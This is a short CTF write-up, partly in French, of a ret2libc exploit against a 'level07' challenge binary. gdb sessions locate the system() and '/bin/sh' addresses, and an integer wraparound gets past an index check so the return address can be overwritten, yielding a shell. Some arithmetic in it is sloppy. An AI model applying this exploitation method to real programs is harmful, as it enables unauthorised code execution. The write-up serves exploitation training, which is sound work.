index overflow
pas d'utilisation possible de l'env car clear au début du code !!


### Find occurence of /bin/sh

(gdb) break main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) print &system  
$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh" 
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) 

system address : 0xf7e6aed0
bin/sh address : 0xf7f897ec

### Find EIP of main function
(gdb) b main
Note: breakpoint 1 also set at pc 0x8048729.
Breakpoint 3 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 
Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebp at 0xffffd708, eip at 0xffffd70c
(gdb) 

=> eip address 0xffffd70c de la fonction main
0x8048741
### Find address of tab[100]

address is 0xffffcd24

```
gdb
start 
disas main 

   0x080488df <+444>:   test   %eax,%eax
   0x080488e1 <+446>:   jne    0x80488f8 <main+469>
   0x080488e3 <+448>:   lea    0x24(%esp),%eax
   0x080488e7 <+452>:   mov    %eax,(%esp)
   0x080488ea <+455>:   call   0x8048630 <store_number>
   0x080488ef <+460>:   mov    %eax,0x1b4(%esp)
   0x080488f6 <+467>:   jmp    0x8048965 <main+578>
   0x080488f8 <+469>:   lea    0x1b8(%esp),%eax
   0x080488ff <+476>:   mov    %eax,%edx
   0x08048901 <+478>:   mov    $0x8048d61,%eax
   0x08048906 <+483>:   mov    $0x4,%ecx
   0x0804890b <+488>:   mov    %edx,%esi

   b*0x080488ea
   r
   x $eax
=> 0xffffd544:     0x00000000

```

### Calculate tab index to overwrite

interval between eip and tab 0xffffd70c - 0xffffd544 = 0x9E8 = 456 / 4 = 114
On divise par 4 car index d'int donc 4 bytes

### Set sellcode to eip+8

0xf7f897ec => 4160264172

insruction : store
number : 4160264172
index : 116 (eip + 2 * 4)

### Set system address to eip

0xf7e6aed0 => 4159090384

insruction : store
number : 4159090384
index : 114

problème : 114 est divisible par 3
(UINTMAX + 1) + 456 = 456
(4294967295 + 1 + 456) / 4 = 1073741938

and then quit and we get a shell 

https://stackoverflow.com/questions/19124095/return-to-lib-c-buffer-overflow-exercise-issue